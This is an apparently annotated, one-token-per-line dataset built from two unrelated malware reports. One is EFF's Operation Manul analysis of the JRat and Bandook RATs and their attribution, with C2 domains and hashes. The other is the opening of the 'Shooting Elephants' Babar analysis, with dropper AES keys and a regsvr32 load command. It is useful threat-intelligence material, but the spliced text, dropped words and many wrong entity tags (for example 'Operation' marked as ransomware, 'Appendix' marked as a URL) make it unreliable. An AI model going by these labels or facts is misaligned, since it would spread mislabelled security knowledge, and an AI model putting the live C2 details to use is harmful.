thwart
analysis
by
a
malware
researcher
.

Fig
.
6
An
example
of
the
ZKM
obfuscated
JRat B_malware.backdoor
code
.

The
code
itself
is
obfuscated
using
Zendix
Klass
Master
(
ZKM
)
,
a
commercially-available
Java
obfuscator
.

ZKM
obfuscates
the
code
by
giving
it
generic
class
,
method
,
and
variable

7
http://www.zelix.com/klassmaster/featuresZKMScript.html B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

names
,
it
also
encodes
the
strings
by
xoring
them
with
a
series
of
random
bytes
,
and
includes
extraneous
code-paths
.

All
of
this
is
done
to
make
the
java
bytecode
harder
to
decompile
and
analyze
for
the
reverse
engineer
.

The
JRat B_malware.backdoor
JAR
file
contains
an
encrypted
config
file
named
config.dat
.

The
JRat B_malware.backdoor
config
file
is
encrypted
using
AES
in
CBC
mode
.

The
encryption
key
and
IV
are
cleverly
hidden
in
the
'
extra
'
field
for
the
zipped
config.dat
file
.

As
illustrated
in
the
example
below
(
Fig
.
7
)
,
the
extra
field
begins
at
offset
0x30
of
the
file
header
for
a
given
file
in
the
compressed
JAR
.

Within
the
32
byte
extra
field
,
the
first
16
bytes
are
the
AES
decryption
key
,
and
the
last
16
bytes
store
the
IV
.

Fig
.
7
An
example
file
header
in
a
compressed
Zip
or
JAR
file
.

Once
it
is
decrypted
,
we
are
able
to
extract
the
plaintext
configuration
information
including
the
domain
of
the
command
and
control
server
and
port
number
(
Fig
8
)
.

JRat B_malware.backdoor
also
employs
anti-virtualization
features
to
detect
and
shut
down
if
it
is
being
run
in
VirtualBox
,
VMware
,
or
other
virtualization
software
.

JRat B_malware.backdoor
is
low
cost
,
versatile
,
extensible
,
and
feature
rich
.
Given
these
facts
and
the
diversity
of
systems
that
JRat B_malware.backdoor
can
infect
it
is
perhaps
not
surprising
that
the
attackers
chose
this
particular
RAT B_malware.unknown
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

delayms=­1
addresses=axroot.com:5006
,
hiddenfile=false
icon=­1
mutex=false
error=true
title=
runnextboot=false
timeout=false
droppath=2
tititle=jRAT
melt=false
toms=­1
reconsec=10
mport=­1
perms=­1
id=Name5006
per=false
os=win
mac
linux
pass=7110eda4d09e062aa5e4a390b0a572ac0d2c0220
debugmsg=true
message=
delay=false
ti=true
vm=false
timsgfail=Disconnected
from
controller
name=japs
timsg=Connected
to
control
controller
window=false

Fig
.
8
A
decrypted
JRat B_malware.backdoor
config
file

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Bandook B_malware.unknown
Malware
Family

The
other
malware
family
used
in
this
campaign
is
the
commercially
available
RAT B_malware.unknown
known
as
'
Bandook B_malware.unknown
.
'

Bandook B_malware.unknown
has
been
available
since
roughly
2007
.

This
sample
seems
to
have
been
continuously
developed
and
improved
over
the
course
of
the
last
couple
of
years
.

Unlike
JRat B_malware.backdoor
,
Bandook B_malware.unknown
is
only
able
to
target
Windows
computers
.

Core
Functionality

All
Bandook B_malware.unknown
executables
are
similar
in
size
.

Generally
,
they
are
masqueraded
with
fake
Flash
Player
,
Office
document
,
or
PDF
document
icons
.

None
of
the
Bandook B_malware.unknown
samples
we
have
found
in
this
campaign
have
been
configured
so
as
to
execute
an
actual
decoy
document
.

Normally
,
Bandook B_malware.unknown
is
distributed
with
an
initial
stub
.
This
executable
would
contain
another
PE32
binary
as
an
embedded
PE
resource
.

Bandook B_malware.unknown
makes
use
of
a
common
technique
referred
to
as
'
process
hollowing
.
'

It
instantiates
several
suspended
browser
processes
and
then
replaces
the
loaded
executable
memory
with
the
code
contained
in
the
embedded
resource
previously
mentioned
.

hash
b002e8b6406fbdf3de9bfcb3493e61c8a44b331f53125e8fed9daa351c49fd34  B_hash
and
,
more
importantly
,
the
embedded
resource
named
'
O9897DDD
'
with
hash
c447fd4d6e1deb794acde683bb2176becf353c6e1b2acdfced27c4413711f6f0  B_hash
.

Interestingly
,
this
binary
was
uploaded
on
malwr.com B_url.normal
in
early
June
2016
with
the
file
name
'
Form13.exe
'
(
which
might
suggest
a
development
version
)
.

Currently
,
the
same
binary
doesn
'
t
seem
to
be
available
in
any
other
malware
repository
to
which
we
have
access
.

In
this
case
,
the
malware
did
not
execute
after
having
successfully
identified
a
virtualized
environment
,
which
might
suggest
the
upload
was
potentially
done
by
the
authors
as
an
attempt
to
verify
the
evasion
technique
.

It
is
also
worth
noting
that
while
normally
the
embedded
resource
is
obfuscated
in
binaries
distributed
in
the
wild
,
this
specific
case
is
the
only
one
we
identified
with
the
resource
embedded
in
the
clear
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Network
Indicators
and
Modularity

After
some
initialization
,
Bandook B_malware.unknown
performs
an
initial
beacon
with
the
general
information
and
configuration
details
it
previously
collected
.

Then
it
expects
a
command
in
response
from
the
Command
&
Control
server
.
If
idle
,
the
C&C
will
reply
with
'
@0000
'
,
and
the
malware
will
keep
beaconing
back
the
title
bar
of
the
currently
active
window
,
until
it
is
instructed
to
do
something
else
.

Interestingly
,
the
basic
payload
isn
'
t
provided
with
the
code
to
perform
any
significant
action
.

If
instructed
to
do
so
,
Bandook B_malware.unknown
will
download
additional
DLL
files
which
provide
the
specifically
desired
functionality
.

This
is
probably
meant
to
limit
the
exposure
of
the
core
modules
to
analysts
,
and
to
vet
the
infection
before
performing
a
full
deployment
.

In
this
case
the
available
DLLs
can
have
the
names
:
cap.dll
extra.dll
pws.dll
tv.dll
Ammyy.dll

We
were
able
to
obtain
the
first
three
DLLs
,
which
were
located
at
the
URL
hxxp://axroot.com/plg10/  B_url.unknown
.

The
following
is
a
list
of
overall
features
available
in
this
version
of
Bandook B_malware.unknown
:

●
Screen
capture

●
Webcam
recording

●
Audio
recording

●
File
search
,
creation
,
deletion
and
exfiltration

●
Spawn
a
shell

●
Get
list
of
available
Wireless
networks

●
Get
list
of
MTP
devices

●
Monitor
USB
devices

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Attribution

Observed
Links
to
the
Government
of
Kazakhstan

Given
the
common
thread
tying
together
the
targets
we
find
it
likely
that
this
campaign
was
carried
out
by
—
or
on
the
behalf
of
—
the
government
of
Kazakhstan
,
or
forces
allied
with
the
government
.

The
majority
of
the
targets
of
the
malware
campaign
are
currently
embroiled
in
legal
disputes
with
the
government
of
Kazakhstan
in
European
courts
or
are
the
family
members
or
associates
of
people
involved
in
these
disputes
.

The
titles
of
spearphishing
emails
often
indicate
that
the
targets
are
being
singled
out
specifically
for
their
interest
in
matters
pertaining
to
Kazakhstan
,
such
as
'
Information
KZ
,
'
'
Press
document
KZ
,
'
and
'
Kazakh
NEWS
of
importance
-
Vladimir
.
'

Observed
Links
to
Arcanum
Global
Intelligence

Leaked
emails
published
by
Kazaword
allege
that
the
government
of
Kazakhstan
had
previously
hired
a
private
intelligence
company
known
as
Arcanum
to
perform
a
surveillance
and
data
extraction
mission
(
codenamed
'
Raptor
)
targeting
Mr
.
Ablyazov
and
his
family
.

Among
the
services
offered
by
Arcanum
are
'
Full
Spectrum
Cyber
Operation
'
which
they
describe
using
the
following
language
:

When
the
need
exists
,
we
overlay
Full
Spectrum
Cyber
Operation
on
these
core
capabilities
,
our
principals
'
experience
,
and
special
technical
activities
.

We
do
this
in
order
to
offer
a
potent
resource
to
support
cyber
and
information
Operation
planning
and
execution
virtually
anywhere
in
the
world
.

When
our
government
clients
come
under
threat
,
Arcanum
Global
'
s
embedded
specialists
and
capabilities
support
them
with
a
full
suite
of
response
options
,
including
(
in
consonance
with
applicable
laws
and
regulations
)
an
array
of
countermeasures
as
well
as
both
in-kind
and
asymmetric
responses
.

We
invite
you
to
schedule
a
comprehensive
and
completely
confidential
discussion
of
your
cyber
concerns
and
objectives
with
our
specialists
.

After

8
The
emails
themselves
were
hosted
on
Megaupload
and
have
since
been
taken
down
as
a
result
of
litigation
by
the
government
of
Kazakhstan
,
but
they
have
been
reported
on
extensively
.

You
can
find
an
extended
here
:
discussion
contents
http://www.viktor-khrapunov.com/en/publications-en/mediapart/ B_url.normal
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

analyzing
closely
your
requirements
and
the
physical
and
cyber
environments
in
which
you
must
operate
,
Arcanum
Global
'
s
holistic
team
of
technical
,
Operation
and
management
specialists
will
recommend
specific
(
and
potentially
sensitive
)
solutions
–
and
then
stand
beside
you
to
implement
them
and
assure
you
realize
your
goals
and
achieve
mission
success
.

Emails
published
by
Kazaword
and
analyzed
by
Mediapart
allege
that
Arcanum
employed
Bernard
Squarcini
,
head
of
France
'
s
domestic
intelligence
agency
,
the
Direction
centrale
du
renseignement
intérieur
(
DCRI
)
from
2007
to
2012
,
to
inform
the
Kazakh
authorities
of
the
progress
of
the
legal
proceedings
against
Ablyazov
and
to
lobby
certain
figures
in
France
.

Squarcini
confirmed
to
Mediapart
that
the
government
of
Kazakhstan
is
a
client
,
but
Arcanum
spokeswoman
Yael
Hartmann
denied
that
the
company
was
responsible
for
the
spearphishing
attempts
,
insisting
that
the
company
has
complied
with
Swiss
law
.

There
is
certainly
some
strong
evidence
consistent
with
there
being
a
link
between
Operation B_malware.ransom
Manul I
and
the
government
of
Kazakhstan
and
between
the
government
of
Kazakhstan
and
Arcanum
.

However
,
we
observe
no
direct
links
between
Operation B_malware.ransom
Manul I
and
Arcanum
.

The
technical
evidence
discussed
below
,
we
believe
points
instead
to
an
Indian
company
:
Appin
.

Observed
Links
To
Appin

We
examined
the
behavior
of
the
command
and
control
domains
used
by
Operation B_malware.ransom
Manul I
as
they
moved
from
IP
to
IP
.
Using
Passive
Total
,
we
observed
that
the
C2
domains
from
Operation B_malware.ransom
Manul I
used
a
total
of
76
IPs
from
2008-07-20
to
2016-05-11
.

We
must
consider
that
these
domains
could
have
been
used
by
other
actors
over
this
time
period
.

While
considering
attribution
of
the
actors
behind
Operation B_malware.ransom
Manul I
,
we
investigated
the
possibility
of
infrastructure
overlap
with
known
actors
.

Gathering
data
from
existing
APT
reports
we
automated
gathering
of
historical
data
from
known
APT
domains
from
the
Passive
Total
API
and
comparison
with
the
historical
data
from
Operation B_malware.ransom
Manul I
domains
.

From
this
we
were
able
to
observe
overlaps
between
Operation B_malware.ransom
Manul I
and
an
actor
known
as
Appin
.

Appin
is
an
Indian
company
that
allegedly
provides
offensive

9
https://github.com/kbandla/APTnotes B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

cyber-capability
on
a
contract
basis
.

A
2013
report
by
the
cybersecurity
firm
Norman
Shark
,
titled
'
Operation
Hangover
:
Unveiling
an
Indian
Cyberattack
Infrastructure
'
,
describes
multiple
campaigns
linked
to
this
actor
.

The
campaigns
included
attacks
on
Punjabi
separatists
,
Norwegian
telecom
Telenor
,
and
multiple
other
companies
.

Appin
is
an
exceptionally
noisy
actor
,
which
might
be
expected
given
the
contract
nature
of
their
work
.
Prior
research
revealed
607
domains
related
to
Appin
which
we
were
able
to
link
via
historical
passive
DNS
to
1345
IPs
.
Of
these
,
there
were
direct
overlaps
for
two
of
the
Operation B_malware.ransom
Manul I
domains
.

There
were
indirect
overlaps
(
same
IP
,
at
different
times
)
with
110
of
the
Operation
Hangover
domains
and
all
but
two
of
the
domains
associated
with
Operation B_malware.ransom
Manul I
.

The
domains
researchwork.org  B_url.unknown
and
dropboxonline.com B_url.unknown
were
both
on
64.202.189.170  B_ip.unknown
on
2011-01-14
.
Additionally
,

the
domains
adobeair.net  B_url.unknown
and
bikefanclub.info  B_url.unknown
both
resided
on
50.63.202.94  B_ip.unknown
from
2014-04-24
to
2014-04-25
.

The
researchwork.org  B_url.unknown
and
bikefanclub.org B_url.unknown
domains
were
attributed
to
Appin
in
the
Operation
Hangover
report
,
while
adobeair.net  B_url.unknown
and
dropboxonline.com B_url.unknown
were
observed
during
the
investigation
of
Operation B_malware.ransom
Manul I
.

Additionally
there
was
a
near
overlap
between
abobeair[.]net  B_url.unknown
(
one
of
the
Operation B_malware.ransom
Manul I
domains
)
and
appinsecurity[.]com B_url.unknown
(
attributed
to
Appin
in
the
Operation
Hangover
report
)
both
hosted
at
174.120.120.151 B_ip.unknown
just
five
days
apart
in
August
of
2010
.

What
'
s
more
,
according
to
an
appeal
filed
in
a
Swiss
court
on
behalf
of
the
Ablyazov
family
,
several
of
the
malware
samples
sent
to
Mr
.
Ablyazov
'
s
son-in-law
and
his
attorney
and
linked
with
this
campaign
were
variants
of
the
HackBack  B_malware.unknown
Trojan
.

This
Trojan
is
in
the
same
malware
family
as
the
Trojan
found
on
an
Angolan
activist
'
s
computer
at
the
Oslo
Freedom
Forum
in
2013
—
which
was
also
linked
to
Appin
by
researchers
at
ESET
and
Norman
Security
.

We
were
unable
to
obtain
the
samples
mentioned
in
the
legal
documents
at
the
time
of
this
writing
.

A
report
written
by
the
Swiss
federal
police
,
which
investigated
the
origin
of
several
of
the
spearphishing
emails
sent
to
Ablyazov
'
s
family
and
associates
,
concluded
that
the
emails
were
sent
from
IP
addresses
in
India
.
10http://enterprise-manage.norman.c.bitbit.net/resources/files/Unveiling_an_Indian_Cyberattack_Infrastructure.pdf B_url.normal
11http://ver007.com/tools/APTnotes/2013/Unveiling%20an%20Indian%20Cyberattack%20Infrastructure%20-%20appendixes.pdf B_url.normal
12http://www.welivesecurity.com/2013/06/05/Operation-hangover-more-links-to-the-oslo-freedom-forum-incident/  B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

While
there
are
links
to
Appin
,
it
'
s
not
conclusive
that
Operation B_malware.ransom
Manul I
was
carried
out
by
this
actor
.

Both
50.63.202.94  B_ip.unknown
and
64.202.189.170  B_ip.unknown
are
very
busy
domains
.

Passive
Total
tells
us
that
50.63.202.94  B_ip.unknown
has
hosted
4535
unique
domains
since
2012
,
while
64.202.189.10 B_ip.unknown
has
hosted
4213
unique
domains
since
2009
.

Additionally
,
while
the
overlap
with
Appin
exists
,
the
fact
that
domains
used
the
same
IP
at
the
same
time
is
insufficient
for
concrete
attribution
.

The
evidence
is
consistent
with
links
to
Appin
,
but
remains
inconclusive
.

Certainly
,
the
sort
of
targeting
we
have
seen
in
Operation B_malware.ransom
Manul I
appears
to
be
consistent
with
other
efforts
targeting
activists
that
have
been
associated
with
the
same
actor
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Fig
9
.
An
illustration
of
the
shared
network
infrastructure
between
Operation B_malware.ransom
Manul I
and
Operation
Hangover
.

Domains
highlighted
in
red
shared
servers
with
Operation B_malware.ransom
Manul I
domains
at
the
same
time
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Other
Possible
Targets

Fig
10
.
Uploaded
password
files
from
other
victims

While
investigating
the
C2
servers
associated
with
Operation B_malware.ransom
Manul I
,
we
discovered
several
open
directories
which
contained
files
presumably
related
to
other
Operation
being
run
by
this
same
actor
(
Fig
10
)
.

Additionally
,
we
discovered
web
control
panels
for
several
different
commodity
RATs
located
under
directories
that
appeared
to
be
code
-
names
for
different
Operation
(
Fig
11
)
.

We
also
discovered
several
files
which
were
presumably
uploaded
from
other
victims
'
computers
(
Fig
12
)
.

Lastly
,
we
discovered
encrypted
data
dumps
from
yet
more
campaigns
,
which
we
were
unable
at
the
time
of
this
report
.

We
found
many
related
samples
of
the
Bandook B_malware.unknown
Trojan
while
we
were
doing
our
example
,
research
.

65af112ce229ad888bf4bbba1e3dba701e0e68c9caf81543bb395a8b8192ba8e  B_hash
contains
references
to
Al
Qaeda/ISIS
material
and
the
forged
document
is
from
an
Arabic
language
pack
.

This
sample
however
is
associated
with
the
same
C2
servers
used
by
Operation B_malware.ransom
Manul I
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

We
also
found
several
uploaded
log
files
which
indicate
the
presence
of
an
Android
RAT B_malware.unknown
.

Unfortunately
we
were
to
find
samples
of
this
RAT B_malware.unknown
at
the
time
of
this
report
.

The
discoveries
that
we
made
while
investigating
the
command
and
control
infrastructure
associated
with
this
campaign
suggest
that
these
attackers
are
'
hired
guns
'
and
have
multiple
Operation
against
different
targets
going
on
at
the
same
time
.

Fig
11
.
Web
based
RAT B_malware.unknown
control
panels
found
on
Operation B_malware.ransom
Manul I
C2
Servers

Fig
12
.
Uploaded
documents
from
the
victim
of
another
campaign
found
on
Operation B_malware.ransom
Manul I
C2
servers
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Conclusion

Operation B_malware.ransom
Manul I
is
not
particularly
sophisticated
,
but
it
is
well
-
understood
that
attacks
don
'
t
need
to
be
sophisticated
in
order
to
be
effective
.

Not
a
single
sample
that
we
have
found
in
this
campaign
has
employed
a
0
-
day
vulnerability
.

Unlike
the
lawful
interception
software
that
companies
such
as
FinFisher   B_malware.backdoor
and
Hacking
Team
sell
to
governments
and
law
enforcement
,
the
RATs
employed
in
this
campaign
are
not
only
commercially
-
available
to
anyone
,
they
'
re
cheap
.

The
fact
that
these
attacks
are
not
sophisticated
should
not
discourage
other
researchers
from
doing
similar
work
.

For
activists
and
journalists
who
are
being
surveilled
by
authoritarian
governments
,
surveillance
is
often
just
the
first
step
in
a
campaign
of
intimidation
,
threats
,
and
even
direct
violence
.

This
kind
of
security
research
has
the
potential
to
have
a
real
impact
on
vulnerable
people
.

We
suspect
that
the
use
of
malware
by
governments
to
spy
on
political
dissidents
,
especially
exiles
who
live
outside
of
their
government
'
s
direct
sphere
of
influence
is
increasingly
common
,
which
presents
many
opportunities
for
further
research
.

The
possible
connections
between
the
government
of
Kazakhstan
and
companies
that
provide
'
hackers
for
hire
'
suggest
that
the
problem
of
governments
using
malware
to
spy
lawful
on
political
exiles
and
independent
journalists
goes
beyond
the
sale
of
interception
software
.

We
hope
that
further
research
will
help
to
shed
light
on
this
practice
and
the
companies
that
make
these
services
available
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Acknowledgements

There
are
many
people
without
whom
this
work
would
not
have
been
possible
.

The
authors
wish
to
thank
the
researchers
behind
Operation
Hangover
,
whose
work
we
depended
heavily
upon
:
Snorre
Fagerland
,
Morten
Kråkvik
,
Jonathan
Camp
,
and
Ned
Moran
.

The
authors
wish
to
give
special
thanks
VirusTotal
,
Joe
Security
,
Hex-Rays
,
and
Passive
Total
for
providing
access
to
their
software
and
services
.

Additionally
we
'
d
like
to
thank
David
Greene
,
Jamie
Lee
Williams
,
Meghan
Fenzel
,
Nate
Cardozo
,
Kurt
Opsahl
,
Soraya
Okuda
,
and
Marion
Marschalek
,
for
their
patience
,
help
,
support
,
and
advice
.

We
would
also
like
to
thank
our
friends
and
family
who
supported
us
throughout
this
research
.

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Appendix  B_url.unknown
A I
:
Indicators
of
Compromise

C2
Servers

The
samples
from
the
Operation B_malware.ransom
Manul I
campaign
described
in
this
paper
use
the
following
command
and
control
(
c2
)
domains
.
axroot.com  B_url.unknown
kaliex.net  B_url.unknown
adobeair.net  B_url.unknown
mangoco.net B_url.unknown
jaysonj.no-ip.biz B_url.unknown
orange2015.net  B_url.unknown
accountslogin.services  B_url.unknown
adobeinstall.com  B_url.unknown
adobe-flashviewer.accountslogin.services  B_url.unknown
dropboxonline.com B_url.unknown

Hashes

The
following
are
hashes
of
malware
samples
discovered
during
our
research
which
are
associated
with
Operation B_malware.ransom
Manul I
.

0491f4e55158d745fd1653950c89fcc9b37d3c1102680bd3ce67616a36bb2592  B_hash
06529ac1d3388732ebca75b8ee0adf0bc7f45d4c448ec98223dd7a258a0f1f33  B_hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac  B_hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac  B_hash
1e3966e77ad1cbf3e3ef76803fbf92300b2b88af39650a1208520e0cdc05645b  B_hash
2431ff8ba00923a9c115a57e541d9d20e0a68b6cb1b48b87e7797864cf07dfab  B_hash
345773dc4215c8c189d21536755614ca7b89082b96563239e363dd72c0cd8c68  B_hash
373231f5be17e09e4ce94f76b35e5be57c961d6c8a9286b2e20e203d53b3c9dd  B_hash
39802d53ae4a29c528626b0870872040dc5c994fb3b6b9e4a3b982144ad56e6c  B_hash
40d30bc2db27e2a8a12cdeb5aae19f04064e5a1775bd3e6cf61a7070b797d3b3  B_hash
40e9c694901aeb27993a8cd81f872076ee430e151f64af06993eb79442103ef8  B_hash

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG
4730c6033d8644c0aae46003bab3254e4beb62187573ffb5ba5bc95a28ddcd93  B_hash
4f1923485e8cdd052467d335a6384f93cd1d50b5d927aea471e56290be29ffa3  B_hash
576ca2b0c5fe1c756c245cb82d6a2ecce7f6976d5c3f3b338f686e06955032cb  B_hash
5e322d208d61dcbf17914e24103710c52878e8cf50957f3d336736f4a1851951  B_hash
652ec150db9a191942807ee5cf4772e75dfac562739477eacc6655fbec880ad7  B_hash
65af112ce229ad888bf4bbba1e3dba701e0e68c9caf81543bb395a8b8192ba8e  B_hash
6eea4a67305f67cc7c016256e93eb816de32b6e9ad700f75828be9f97c28c0e0  B_hash
75ee00a36d324a89fc9ef4d7dbe606b885ec072388ef7b55d39112af7dbca665  B_hash
75f51845de4d0deae8aaab737a71bb8aed14bfa4919712bcdea212f62b70c07f  B_hash
778a01389b17a8ff20c445e0856b3704ac50844faa8d36c01e0ff02518e4c6d3  B_hash
8c33b645e6362ab7e8c8a9989715193b4c9655fd576812218f3957c3fff8c429  B_hash
8d054753e0ed754398835bed794ba4fae64a2efb018f98d3c61064de8aaa231d  B_hash
91d251b11c59b5e25e0c1ae55421893fce8f180a97e2eef88122c61e8cdf1bae  B_hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e  B_hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e  B_hash
99e699e358be9e59cfad6124f44a96d3d1577edf9767afe17281adb37d901e22  B_hash
a91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578  B_hash
ade5bd96bfba79051f8e8ed8fe973edd89e5f1ec6469393967c3ad7519a95650  B_hash
b002e8b6406fbdf3de9bfcb3493e61c8a44b331f53125e8fed9daa351c49fd34  B_hash
d803c4d736bcb247d23735a7160b93c2f3d98de5d432680f5eaf9212f965248c  B_hash
e4381ad27b10d895ad8338ba399221d385653b83b8d5dbd5a32cb86a0c318d44  B_hash
eccb3d7d1e8a7cd27c7caf21885c95122eed28361651e8e47b8c02828b232c7e  B_hash
f56c545a3157f1cf753de5ac56bb52e5af42bc6b8225d26aafdce3b430287f34  B_hash
fc49b37b879af6e675f223d324d32c894ba83952b2ee109d52bfa9bd8212e005  B_hash
f9dd8ebb062842798d53e78633ed9ca296f4a93dafb0fe60320a34a3d58d78d4  B_hash

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG

Appendix  B_url.normal
B I
:
Further
Reading
http://www.viktor-khrapunov.com/en/publications-en/mediapart/ B_url.normal
http://enterprise-manage.norman.c.bitbit.net/resources/files/Unveiling_an_Indian_Cyberattack_Infrastructure.pdf B_url.normal
https://s3-us-west-2.amazonaws.com/cymmetria-blog/public/Unveiling_Patchwork.pdf  B_url.normal
http://www.welivesecurity.com/2013/05/16/targeted-threat-pakistan-india/  B_url.normal
https://www.eff.org/deeplinks/2015/11/judge-rules-respublika-cannot-be-forced-take-down-articles-kazakhstan-proceed B_url.normal

ELECTRONIC
FRONTIER
FOUNDATION

EFF.ORG
SHOOTING

ELEPHANTS
page
|
1

SHOOTING
ELEPHANTS

DROPPER

SHA-1 B_hash

File
Size

Compile
Time

IMPLANT

SHA-1 B_hash

File
Size

Compile
Time

9fff114f15b86896d8d4978c0ad2813d  B_hash

27a0a98053f3eed82a51cdefbdfec7bb948e1f36  B_hash

693.4
KB
(
710075
bytes
)

2011-08-29
11:48:42

4525141d9e6e7b5a7f4e8c3db3f0c24c  B_hash

efbe18eb8a66e4b6289a5c53f22254f76e3a29bd  B_hash

585.4
KB
(
599438
bytes
)

2011-08-29
13:02:29

Special
thanks
for
their
contribution
in
the
making
of
this
report
go
to
Morgan
Marquis-Boire
,
Joan
Calvet
,
Paul
Rascagnéres
,
Alex
Dulaunoy
,
Raphael
Vinot
and
the
remaining
team
of
CIRCL
Luxembourg
.

You
guys
rock
\
m
/

Comments
or
inquiries
please
direct
to
Marion
Marschalek
(
0xF372F2CA
)
.

Babar B_malware.drop
and
the
related
crowd
of
animalesque
malware
will
be
presented
at
SyScan
'
15
conference
(
https://www.syscan.org/ B_url.normal
)
in
March
2015
.

No
elephants
were
harmed
in
the
making
of
this
report
.

Creative
Commons
Attribution-NonCommercial-ShareAlike
4.0
International
License
.

This
work
is
licensed
under
a

page
|
2

CONTENT

1
.
SHOOTING
ELEPHANTS....................................................................................4

2
.
MISCREANT'S
DROPPER..................................................................................5

3
.
MISCREANT'S
IMPLANT...................................................................................6

3.1
ANTI-ANALYSIS
MEASURES........................................................................6

3.2
Babar B_malware.drop
CAME
TO
STAY................................................................................7

3.3
CONFIGURATION
DATA..............................................................................7

3.4
MODUS
OPERANDI
ELEPHANTI.................................................................9

3.5
FUNCTIONALITY.......................................................................................10

3.5.1
THE
KEYLOGGER
MODULE................................................................10

3.5.2
INVADING
DESKTOP
PROCESSES.......................................................11

3.5.3
I
AM
ROOT(kit)..................................................................................11

3.6
STOLEN
GOODS........................................................................................13

3.7
CALLING
HOME........................................................................................14

4
.
BEYOND
BABAR.............................................................................................16  B_malware.drop


5
.
RESOURCES
....................................................................................................18  B_url.normal

6
.
APPENDICES..................................................................................................19  B_ip.unknown

page
|
3

1
.
SHOOTING
ELEPHANTS

Subject
of
this
analysis
is
a
fascinating
piece
of
malware
,
which
invades
Windows
desktop
machines
and
aims
at
..
well
,
all
the
things
.

The
analyzed
malware
consists
of
a
dropper
and
an
implant
,
which
invades
Windows
processes
to
steal
data
from
instant
messengers
,
softphones
,
browsers
and
office
applications
.

A
fully
blown
espionage
kit
,
so
to
say
,
sophisticated
almost
.
The
implant
is
able
to
hook
APIs
of
interest
in
dedicated
remote
processes
,
to
steal
data
on
the
fly
.

More
interesting
than
the
malware
itself
though
is
the
path
to
the
associated
symbol
file
,
which
appears
embedded
in
the
dropper
.

The
analyzed
malware
samples
come
with
the
internal
project
name
'
Babar64 B_malware.drop
'
.

Illustration
1
|
The
.pdb
path
embedded
in
Babar's
dropper

The
myth
of
Babar B_malware.drop
has
been
around
for
a
while
in
the
intelligence
community
.

Questions
have
been
raised
since
Le
Monde
published
an
article
on
Babar B_malware.drop
in
2014
[
1
]
and
were
recently
fuelled
by
a
leaked
government
presentation
found
among
a
stash
of
documents
published
in
January
by
Spiegel
[
2
]
.

The
leaked
document
was
authored
by
the
Communications
Security
Establishment
Canada
(
CSEC
)
and
reports
about
a
potential
nation
state
attack
involving
malware
named
Babar B_malware.drop
.

The
actor
behind
the
attacks
is
assumed
to
be
French
inteligence
.

Assumptions
are
based
on
certain
binary
attributes
,
language
and
location
of
infrastructure
as
well
as
targets
.

The
binaries
at
hand
fit
well
with
the
description
CSEC
provides
,
although
it
is
quite
clear
they
are
a
newer
version
from
what
CSEC
had
uncovered
around
2009
.

It
is
not
clear
whether
the
compilation
timestamps
are
falsified
,
but
an
earlier
compilation
time
than
the
actual
stamp
seems
unlikely
.

Doubtlessly
though
,
the
Babar B_malware.drop
binaries
match
with
a
malware
strain
representing
itself
as
Bunny B_malware.unknown
,
as
well
as
a
family
dubbed
NBOT  B_malware.unknown
or
TFC
.

page
|
4

2
.
MISCREANT B_malware.drop
'
S
DROPPER

The
dropper
operates
straight
forward
;

it
fetches
the
encrypted
DLL
from
its
own
binary
from
outside
its
resource
section
,
decrypts
it
and
hides
it
in
the
file
system
.

Then
it
goes
on
to
load
the
DLL
using
Windows
regsvr32.exe
.

To
achieve
this
it
spawns
a
dedicated
process
with
the
command
line
'
'regsvr32.exe'/s/n/i'%APPDATA%\%DLLNAME%''
.

The
DLL
name
is
random
but
legitimately
looking
and
hardcoded
for
a
specific
dropper
.

It
is
also
stored
as
encrypted
string
in
the
binary
,
and
has
been
seen
to
decrypt
to
either
'
perf585.dll
'
or
'
dump21cb.dll
'
depending
on
the
dropper
.

The
encryption
algorithm
used
is
AES
(
Advanced
Encryption
Standard
)
with
128-bit
keys
.

The
keys
used
for
decryption
are
'2033AF73A9AC72D3BEE6A57392BA376C'
for
the
implant
filename
and
'A00E3EB33A1CD3AAA0BE3FB3F90A9615'
for
decrypting
the
binary
.

AES
is
the
encryption
algorithm
of
choice
throughout
the
dropper
and
its
implant's
operations
.

Interestingly
,
the
Babar B_malware.drop
dropper
as
well
as
the
implant
show
a
similar
method
of
API
name
obfuscation
as
the
Bunny B_malware.unknown
malware
and
samples
from
the
NBOT B_malware.unknown
family
.

Dedicated
APIs
are
loaded
through
a
resolution
function
,
which
searches
for
library
exports
by
comparing
hashes
of
the
export
names
with
a
given
hash
.

For
the
Babar B_malware.drop
project
though
the
attackers
used
an
adapted
version
of
SHA-1
,
as
opposed
to
the
simple
XOR/ROL
hash
algorithm
which
was
used
in
the
Bunny B_malware.unknown
project
.

After
infection
the
dropper
executes
a
separate
command
line
through
spawning
a
cmd.exe
process
,
which
is
instructed
to
wait
for
1
second
before
deleting
the
dropper
binary
on
disk
.

This
way
the
malware
reduces
forensic
artefacts
,
staying
behind
after
infection
.
Curiously
though
,
the
regsvr32.exe
process
used
to
load
the
dropped
implant
remains
running
.

This
way
Babar B_malware.drop
leaves
a
visible
process
on
the
process
list
during
execution
.

As
the
project
name
'
Babar64 B_malware.drop
'
suggests
,
dropper
and
implant
are
designed
to
work
on
32-bit
and
on
64-bit
Windows
versions
.

However
,
process
hooking
and
injection
can
only
affect
32-bit
processes
due
to
the
bitness
of
the
implant
itself
.

page
|
5

3
.
MISCREANT'S
IMPLANT

